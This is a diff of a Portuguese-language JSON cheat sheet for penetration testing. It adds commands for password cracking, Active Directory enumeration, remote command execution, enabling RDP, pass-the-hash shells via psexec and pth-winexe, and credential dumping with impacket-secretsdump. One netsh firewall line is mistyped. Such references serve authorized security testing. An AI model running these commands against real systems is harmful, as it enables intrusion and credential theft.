@@ -261,13 +261,23 @@
   },
   {
     "tool": ["jhon"],
-    "description":"unshadow $PASSWD $SHADOW > $FILEOUT",
-    "command": "Preparar arquivos passwd e shadow para quebra do hash",
+    "description":"Preparar arquivos passwd e shadow para quebra do hash",
+    "command": "unshadow $PASSWD $SHADOW > $FILEOUT",
     "service": [],
     "port": [],
     "category": [],
     "so": [],
     "note": ""
+  },
+  {
+    "tool": ["jhon"],
+    "description":"Gerar wordlist personalizada à partir de algumas palavras",
+    "command": "john --wordlist=$FILEIN --rules --stdout > $FILEOUT",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": "Para personalizar as regras do john edite o arquivo /etc/john/john.conf na sessão 'Wordlist mode rules'"
   },
   {
     "tool": ["SAM"],
@@ -320,12 +330,202 @@
     "note": "Somente Windows XP/2003"
   },
   {
-    "tool": [],
-    "description":"",
-    "command": "",
-    "service": [],
+    "tool": ["host"],
+    "description":"Resolver host utilizando outro servidor DNS",
+    "command": "host $RHOST $DNS",
+    "service": ["DNS"],
     "port": [],
-    "category": [],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["smbclient"],
+    "description":"Listar um domínio através do SMB",
+    "command": "smbclient -L \\$RHOST -U $USER -W $WORKGROUP",
+    "service": ["SMB"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["smbclient"],
+    "description":"Conectar um domínio através do SMB",
+    "command": "smbclient //$RHOST/ADMIN$ -U $USER -W $WORKGROUP",
+    "service": ["SMB"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["crackmapexec"],
+    "description":"Enumeração de hosts com AD",
+    "command": "crackmapexec smb $RHOST -d $WORKGROUP -u $USER -p '$PASS'",
+    "service": ["SMB","AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "É possível criar uma lista de hosts e indicar o arquivo ao invés de um IP apenas."
+  },
+  {
+    "tool": ["crackmapexec"],
+    "description":"Executar comandos no host",
+    "command": "crackmapexec smb $RHOST -u $USER -p '$PASS' -x 'whoami'",
+    "service": ["SMB","AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["crackmapexec"],
+    "description":"Verificar os módulos disponíveis",
+    "command": "crackmapexec smb $RHOST -u $USER -p '$PASS' -L",
+    "service": ["SMB","AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["crackmapexec"],
+    "description":"Ativar RDP no host Windows",
+    "command": "crackmapexec smb $RHOST -u $USER -p '$PASS' -M rdp -o ACTION=enable",
+    "service": ["RDP"],
+    "port": [3389],
+    "category": ["Exploitation"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["netsh"],
+    "description":"Alterar regras de portas do firewall do Windows",
+    "command": "netsh advfirewall firewall and rule name='rdp' protocol=TCP dir=in localport=3389 action=allow",
+    "service": ["Firewall"],
+    "port": [],
+    "category": ["Exploitation"],
+    "so": [],
+    "note": "No exemplo o nome da regra será rdp, utilizando protocolo TCP a direção é de entrada e a porta que será aberta é 3389"
+  },
+  {
+    "tool": ["psexec"],
+    "description":"Obter shell com credenciais do Windows",
+    "command": "python3 psexec.py $WORKGROUP/$USER:'$PASS'@$RHOST",
+    "service": ["SMB"],
+    "port": [445],
+    "category": ["Exploitation"],
+    "so": [],
+    "note": "O psexec faz parte do pacote Impacket"
+  },
+  {
+    "tool": ["psexec"],
+    "description":"Conectar no host Windows utilizando o hash",
+    "command": "python3 psexec.py $USER@$RHOST -hashes $HASH",
+    "service": ["SMB"],
+    "port": [445],
+    "category": ["Exploitation"],
+    "so": [],
+    "note": "O psexec faz parte do pacote Impacket"
+  },
+  {
+    "tool": ["winexe"],
+    "description":"Obter shell do host Windows",
+    "command": "winexe -U $USER%$PASS //$RHOST cmd.exe",
+    "service": ["SMB"],
+    "port": [445],
+    "category": ["Exploitation"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["pth"],
+    "description":"Obter shell do host Windows utililizando o hash do usuário",
+    "command": "pth-winexe -U $USER%$HASH //$RHOST cmd.exe",
+    "service": ["SMB"],
+    "port": [445],
+    "category": ["Exploitation"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["rpcclient"],
+    "description":"Conectar em servidor AD para enumeração",
+    "command": "rpcclient -W $WORKGROUP -U USER $RHOST",
+    "service": ["SMB"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "É necessário utilizar credenciais válidas e o host do servidor"
+  },
+  {
+    "tool": ["rpcclient"],
+    "description":"Listar usuários do servidor AD",
+    "command": "enumdomusers",
+    "service": ["SMB", "AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "Necessário estar conectado com rpcclient"
+  },
+  {
+    "tool": ["rpcclient"],
+    "description":"Listar detalhes de um usuário do servidor AD",
+    "command": "queryuser $RID",
+    "service": ["SMB", "AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "Necessário estar conectado com rpcclient"
+  },
+  {
+    "tool": ["rpcclient"],
+    "description":"Listar grupos do servidor AD",
+    "command": "enumdomgroups",
+    "service": ["SMB", "AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "Sempre verifique os membros do grupo de Administradores. Necessário estar conectado com rpcclient"
+  },
+  {
+    "tool": ["rpcclient"],
+    "description":"Listar detalhes do grupo do servidor AD",
+    "command": "querygroup $RID",
+    "service": ["SMB", "AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "Necessário estar conectado com rpcclient"
+  },
+  {
+    "tool": ["rpcclient"],
+    "description":"Listar membros do grupo do servidor AD",
+    "command": "querygroupmem $RID",
+    "service": ["SMB", "AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "Necessário estar conectado com rpcclient"
+  },
+  {
+    "tool": ["impacket"],
+    "description":"Buscar credenciais (Hash) de host AD remoto",
+    "command": "impacket-secretsdump $WORKGROUP/$USER:'$PASS'@$RHOST",
+    "service": ["SMB", "AD"],
+    "port": [445],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["xfreerdp"],
+    "description":"Conexão remota com interface gráfica no host Windows",
+    "command": "xfreerdp /u:$USER /v:$RHOST",
+    "service": ["RDP"],
+    "port": [3389],
+    "category": ["Exploitation"],
     "so": [],
     "note": ""
   },
